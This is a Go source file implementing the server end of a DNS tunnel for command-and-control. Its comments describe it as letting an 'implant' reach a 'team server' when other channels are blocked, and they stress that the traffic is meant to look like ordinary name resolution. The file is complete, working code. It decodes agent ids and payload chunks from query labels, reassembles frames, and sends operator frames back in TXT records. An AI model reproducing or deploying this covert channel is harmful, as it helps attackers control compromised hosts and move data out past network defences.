// Package dnstun implements the DNS tunnel.
//
// A DNS tunnel lets an implant talk to the team server when every other
// channel is blocked: the agent asks a resolver for a name that belongs to
// the tunnel domain, and the answer carries the next frame.  The traffic
// looks like ordinary name resolution, which is exactly the point.
//
// The wire format is deliberately boring:
//
//	query    <seq>.<chunk>.<agent>.<domain>
//	answer   TXT records, each one base32 of a slice of the next frame
//
// * `seq`    is the sequence number of the query, eight hex characters.
// * `chunk`  is the base32 of the payload the agent sends in this query.  It
//            is empty when the agent only polls.
// * `agent`  is the base32 of the agent id.
//
// The frames that travel through the tunnel are ordinary umbra/v1 frames, so
// the session state machine above the transport does not change at all: the
// tunnel is a transport, nothing more.
//
// A tunnel is one way at a time: a query carries the agent's payload and
// picks up the server's answer in the same round trip.  That keeps the
// implementation small and the traffic pattern regular.
package dnstun

import (
	"encoding/base32"
	"encoding/binary"
	"errors"
	"fmt"
	"log/slog"
	"net"
	"strings"
	"sync"
	"time"
)

// The DNS record types the tunnel uses.
const (
	TypeA   uint16 = 1
	TypeTXT uint16 = 16
)

// The DNS class of every record.
const classIN uint16 = 1

// The limits of the tunnel.  They are small on purpose: a DNS query is
// carried by resolvers all over the internet, and a query that is too big
// does not survive them.
const (
	// MaxChunk is the number of payload bytes in one label.
	MaxChunk = 32
	// MaxFrame bounds the frame the tunnel carries in one direction.
	MaxFrame = 256 * 1024
	// MaxPendingFrames bounds the queue of a channel.
	MaxPendingFrames = 64
	// MaxLabel is the maximum length of one DNS label.
	MaxLabel = 63
	// MaxName is the maximum length of a DNS name.
	MaxName = 255
	// DefaultTTL is how long a resolver may cache an answer.
	DefaultTTL = 5
	// MaxRecords is the number of TXT records one answer carries.
	MaxRecords = 8
	// EmptyLabel stands for "no payload".  A DNS label cannot be empty, so
	// the queries that carry nothing need a placeholder.
	EmptyLabel = "-"
)

// The encoding of the payload chunks: base32 without padding, in lower case.
// DNS labels are case insensitive, so the case has to be normalised.
var encoding = base32.StdEncoding.WithPadding(base32.NoPadding)

// Config describes the tunnel endpoint.
type Config struct {
	// The address the DNS server binds to ("127.0.0.1:5353").
	Listen string
	// The domain the tunnel answers for ("tunnel.example.com").
	Domain string
	// The number of payload bytes per label.  Zero means MaxChunk.
	ChunkSize int
	// The TTL of the answers.  Zero means DefaultTTL.
	TTL uint32
}

// A Channel is the queue of one agent.
//
// The tunnel carries *frames*, not bytes: both ends write a four byte length
// in front of every frame, so a chunk boundary in the middle of a frame is
// not a problem.
type Channel struct {
	mu sync.Mutex

	// The frames that were received completely.
	frames chan []byte

	// The reassembly buffer of the inbound bytes.
	inBuf []byte

	// The frame that is being sent to the agent and the offset inside it.
	outFrame  []byte
	outOffset int

	closed    bool
	lastSeen  time.Time
	createdAt time.Time
}

// NewChannel creates an empty channel.
func NewChannel() *Channel {
	now := time.Now()
	return &Channel{
		frames:    make(chan []byte, MaxPendingFrames),
		lastSeen:  now,
		createdAt: now,
	}
}

// Push adds the bytes of a query to the reassembly buffer and hands the
// frames that became complete to the reader.
func (c *Channel) Push(data []byte) {
	if len(data) == 0 {
		return
	}
	c.mu.Lock()
	if c.closed {
		c.mu.Unlock()
		return
	}
	c.inBuf = append(c.inBuf, data...)
	for len(c.inBuf) >= 4 {
		size := int(binary.BigEndian.Uint32(c.inBuf[:4]))
		if size <= 0 || size > MaxFrame {
			// The stream is broken; drop it instead of guessing.
			c.inBuf = nil
			break
		}
		if len(c.inBuf) < 4+size {
			break
		}
		frame := make([]byte, size)
		copy(frame, c.inBuf[4:4+size])
		c.inBuf = c.inBuf[4+size:]
		select {
		case c.frames <- frame:
		default:
			// The agent does not read fast enough; dropping the frame
			// breaks the session, which is better than a silent stall.
			c.mu.Unlock()
			c.Close()
			return
		}
	}
	c.lastSeen = time.Now()
	c.mu.Unlock()
}

// Next returns the next frame the agent sent.  It blocks until a frame
// arrives or the channel is closed.
func (c *Channel) Next() ([]byte, bool) {
	frame, ok := <-c.frames
	return frame, ok
}

// NextTimeout returns the next frame, waiting at most d.
func (c *Channel) NextTimeout(d time.Duration) ([]byte, bool) {
	timer := time.NewTimer(d)
	defer timer.Stop()
	select {
	case frame, ok := <-c.frames:
		return frame, ok
	case <-timer.C:
		return nil, false
	}
}

// ErrBusy is returned by Send when the previous frame was not picked up by
// the agent yet.  A DNS tunnel carries one frame at a time, so the caller has
// to wait for the agent to poll again.
var ErrBusy = errors.New("dnstun: a frame is still being sent")

// Send queues a frame for the agent.
//
// The channel holds one frame at a time: the answer to a query carries the
// current frame, and the next frame waits until it was sent.
func (c *Channel) Send(frame []byte) error {
	if len(frame) > MaxFrame {
		return fmt.Errorf("dnstun: the frame is too large (%d bytes)", len(frame))
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.closed {
		return errors.New("dnstun: the channel is closed")
	}
	if c.outFrame != nil {
		return ErrBusy
	}
	// The frame is length prefixed, exactly like the bytes the agent sends:
	// both ends then agree on where a frame ends even when a chunk boundary
	// falls in the middle of one.
	prefixed := make([]byte, 4+len(frame))
	binary.BigEndian.PutUint32(prefixed[:4], uint32(len(frame)))
	copy(prefixed[4:], frame)
	c.outFrame = prefixed
	c.outOffset = 0
	return nil
}

// NextChunk returns the next slice of the frame that is being sent.
//
// The second result is false when there is nothing to send; when it is true
// the frame was sent completely and the channel is ready for the next one.
func (c *Channel) NextChunk(size int) ([]byte, bool) {
	if size <= 0 || size > MaxChunk {
		size = MaxChunk
	}
	c.mu.Lock()
	defer c.mu.Unlock()
	if c.outFrame == nil {
		return nil, false
	}
	end := c.outOffset + size
	if end > len(c.outFrame) {
		end = len(c.outFrame)
	}
	chunk := make([]byte, end-c.outOffset)
	copy(chunk, c.outFrame[c.outOffset:end])
	c.outOffset = end
	if c.outOffset >= len(c.outFrame) {
		c.outFrame = nil
		c.outOffset = 0
	}
	return chunk, true
}

// Pending reports whether a frame waits for the agent.
func (c *Channel) Pending() bool {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.outFrame != nil
}

// LastSeen reports when the agent last polled.
func (c *Channel) LastSeen() time.Time {
	c.mu.Lock()
	defer c.mu.Unlock()
	return c.lastSeen
}

// Close tears the channel down.
func (c *Channel) Close() {
	c.mu.Lock()
	if c.closed {
		c.mu.Unlock()
		return
	}
	c.closed = true
	c.mu.Unlock()
	close(c.frames)
}

// OnChannel is called when an agent shows up in the tunnel for the first
// time.  The callback owns the session from then on.
type OnChannel func(agentID string, ch *Channel)

// Server is the DNS endpoint of the tunnel.
type Server struct {
	cfg Config
	log *slog.Logger

	mu       sync.Mutex
	channels map[string]*Channel
	sock     *net.UDPConn
	closed   bool
	onFirst  OnChannel
}

// New creates a tunnel server.
func New(cfg Config, log *slog.Logger) *Server {
	if log == nil {
		log = slog.Default()
	}
	if cfg.ChunkSize <= 0 || cfg.ChunkSize > MaxChunk {
		cfg.ChunkSize = MaxChunk
	}
	if cfg.TTL == 0 {
		cfg.TTL = DefaultTTL
	}
	if cfg.Domain != "" {
		cfg.Domain = strings.TrimSuffix(strings.ToLower(cfg.Domain), ".")
	}
	return &Server{
		cfg:      cfg,
		log:      log,
		channels: make(map[string]*Channel),
	}
}

// Start binds the UDP socket and serves the tunnel in the background.
func (s *Server) Start() error {
	listen := s.cfg.Listen
	if listen == "" {
		listen = "127.0.0.1:5353"
	}
	addr, err := net.ResolveUDPAddr("udp", listen)
	if err != nil {
		return fmt.Errorf("dnstun: resolve %s: %w", listen, err)
	}
	sock, err := net.ListenUDP("udp", addr)
	if err != nil {
		return fmt.Errorf("dnstun: listen %s: %w", listen, err)
	}
	s.sock = sock
	go s.serve()
	s.log.Info("dns tunnel listening", "addr", sock.LocalAddr().String(), "domain", s.cfg.Domain)
	return nil
}

// Close shuts the tunnel down.
func (s *Server) Close() error {
	s.mu.Lock()
	if s.closed {
		s.mu.Unlock()
		return nil
	}
	s.closed = true
	sock := s.sock
	channels := make([]*Channel, 0, len(s.channels))
	for _, ch := range s.channels {
		channels = append(channels, ch)
	}
	s.channels = make(map[string]*Channel)
	s.mu.Unlock()
	// Release the sessions that wait for a frame: they would block forever.
	for _, ch := range channels {
		ch.Close()
	}
	if sock != nil {
		return sock.Close()
	}
	return nil
}

// Channel returns the channel of an agent, creating it when needed.
//
// The first time an agent appears the hook is called, so the caller can
// start the session that serves it.
func (s *Server) Channel(agentID string) *Channel {
	s.mu.Lock()
	if ch, ok := s.channels[agentID]; ok {
		s.mu.Unlock()
		return ch
	}
	ch := NewChannel()
	s.channels[agentID] = ch
	hook := s.onFirst
	s.mu.Unlock()
	if hook != nil {
		go hook(agentID, ch)
	}
	return ch
}

// SetOnChannel installs the hook that is called for a new agent.
func (s *Server) SetOnChannel(hook OnChannel) {
	s.mu.Lock()
	s.onFirst = hook
	s.mu.Unlock()
}

// Channels reports how many agents are known to the tunnel.
func (s *Server) Channels() int {
	s.mu.Lock()
	defer s.mu.Unlock()
	return len(s.channels)
}

// serve reads the queries and answers them.
func (s *Server) serve() {
	buf := make([]byte, 4096)
	for {
		n, addr, err := s.sock.ReadFromUDP(buf)
		if err != nil {
			s.mu.Lock()
			closed := s.closed
			s.mu.Unlock()
			if closed {
				return
			}
			continue
		}
		query := make([]byte, n)
		copy(query, buf[:n])
		response := s.Handle(query)
		if response != nil {
			_, _ = s.sock.WriteToUDP(response, addr)
		}
	}
}

// Handle answers one raw DNS query.
//
// It returns nil when the query is not for this tunnel, so the caller can
// forward it to a real resolver.
func (s *Server) Handle(query []byte) []byte {
	id, name, qtype, err := parseQuery(query)
	if err != nil {
		return nil
	}
	if !s.inDomain(name) {
		return nil
	}
	agentID, _, chunk, ok := s.parseName(name)
	if !ok {
		return nil
	}
	ch := s.Channel(agentID)
	ch.Push(chunk)

	// The answer carries the frame that waits for the agent, split into
	// labels.  A frame that is bigger than one label needs several queries.
	var texts []string
	for len(texts) < MaxRecords {
		piece, ok := ch.NextChunk(s.cfg.ChunkSize)
		if !ok {
			break
		}
		texts = append(texts, strings.ToLower(encoding.EncodeToString(piece)))
	}
	return buildResponse(id, name, qtype, texts, s.cfg.TTL)
}

// inDomain reports whether a name belongs to the tunnel domain.
func (s *Server) inDomain(name string) bool {
	if s.cfg.Domain == "" {
		return true
	}
	name = strings.TrimSuffix(strings.ToLower(name), ".")
	return name == s.cfg.Domain || strings.HasSuffix(name, "."+s.cfg.Domain)
}

// parseName splits a tunnel name into the agent id, the sequence number and
// the payload chunk.
func (s *Server) parseName(name string) (agentID string, seq uint64, chunk []byte, ok bool) {
	name = strings.TrimSuffix(strings.ToLower(name), ".")
	if s.cfg.Domain != "" {
		name = strings.TrimSuffix(name, "."+s.cfg.Domain)
	}
	labels := strings.Split(name, ".")
	if len(labels) < 3 {
		return "", 0, nil, false
	}
	// The labels are: <seq>.<chunk>.<agent>
	seqLabel := labels[len(labels)-3]
	chunkLabel := labels[len(labels)-2]
	agentLabel := labels[len(labels)-1]
	if agentLabel == "" {
		return "", 0, nil, false
	}
	decoded, err := encoding.DecodeString(strings.ToUpper(agentLabel))
	if err != nil {
		return "", 0, nil, false
	}
	agent := string(decoded)
	if chunkLabel != "" && chunkLabel != EmptyLabel {
		payload, err := encoding.DecodeString(strings.ToUpper(chunkLabel))
		if err != nil {
			return "", 0, nil, false
		}
		chunk = payload
	}
	fmt.Sscanf(seqLabel, "%x", &seq)
	return agent, seq, chunk, true
}

// -- the DNS codec ---------------------------------------------------------

// parseQuery reads the id, the question name and the question type.
func parseQuery(data []byte) (id uint16, name string, qtype uint16, err error) {
	if len(data) < 12 {
		return 0, "", 0, errors.New("dnstun: the query is truncated")
	}
	if data[2]&0x80 != 0 {
		return 0, "", 0, errors.New("dnstun: this is a response, not a query")
	}
	id = binary.BigEndian.Uint16(data[0:2])
	questions := binary.BigEndian.Uint16(data[4:6])
	if questions != 1 {
		return 0, "", 0, errors.New("dnstun: only one question is supported")
	}
	offset := 12
	var labels []string
	for {
		if offset >= len(data) {
			return 0, "", 0, errors.New("dnstun: the name is truncated")
		}
		length := int(data[offset])
		offset++
		if length == 0 {
			break
		}
		if length&0xC0 != 0 {
			// A compression pointer: the question of a tunnel query never
			// uses one.
			return 0, "", 0, errors.New("dnstun: compressed names are not supported")
		}
		if offset+length > len(data) {
			return 0, "", 0, errors.New("dnstun: a label is truncated")
		}
		labels = append(labels, string(data[offset:offset+length]))
		offset += length
		if len(labels) > 32 {
			return 0, "", 0, errors.New("dnstun: the name has too many labels")
		}
	}
	if offset+4 > len(data) {
		return 0, "", 0, errors.New("dnstun: the question is truncated")
	}
	qtype = binary.BigEndian.Uint16(data[offset : offset+2])
	name = strings.Join(labels, ".")
	return id, name, qtype, nil
}

// buildResponse builds the answer of a query.
//
// The question is echoed, the answers are TXT records with the payload
// chunks.
func buildResponse(id uint16, name string, qtype uint16, texts []string, ttl uint32) []byte {
	out := make([]byte, 0, 512)
	head := make([]byte, 12)
	binary.BigEndian.PutUint16(head[0:2], id)
	// QR=1, RD=1, RA=1
	binary.BigEndian.PutUint16(head[2:4], 0x8180)
	binary.BigEndian.PutUint16(head[4:6], 1) // QDCOUNT
	binary.BigEndian.PutUint16(head[6:8], uint16(len(texts)))
	out = append(out, head...)
	out = append(out, encodeName(name)...)
	tail := make([]byte, 4)
	binary.BigEndian.PutUint16(tail[0:2], qtype)
	binary.BigEndian.PutUint16(tail[2:4], classIN)
	out = append(out, tail...)
	for _, text := range texts {
		answer := make([]byte, 0, len(text)+16)
		// The answer points at the question name.
		answer = append(answer, 0xC0, 0x0C)
		typeField := make([]byte, 8)
		binary.BigEndian.PutUint16(typeField[0:2], TypeTXT)
		binary.BigEndian.PutUint16(typeField[2:4], classIN)
		binary.BigEndian.PutUint32(typeField[4:8], ttl)
		answer = append(answer, typeField...)
		length := make([]byte, 2)
		binary.BigEndian.PutUint16(length[0:2], uint16(len(text)+1))
		answer = append(answer, length...)
		answer = append(answer, byte(len(text)))
		answer = append(answer, text...)
		out = append(out, answer...)
	}
	return out
}

// encodeName encodes a domain name into labels.
func encodeName(name string) []byte {
	out := make([]byte, 0, len(name)+2)
	for _, label := range strings.Split(name, ".") {
		if label == "" {
			continue
		}
		if len(label) > MaxLabel {
			label = label[:MaxLabel]
		}
		out = append(out, byte(len(label)))
		out = append(out, label...)
	}
	out = append(out, 0)
	return out
}
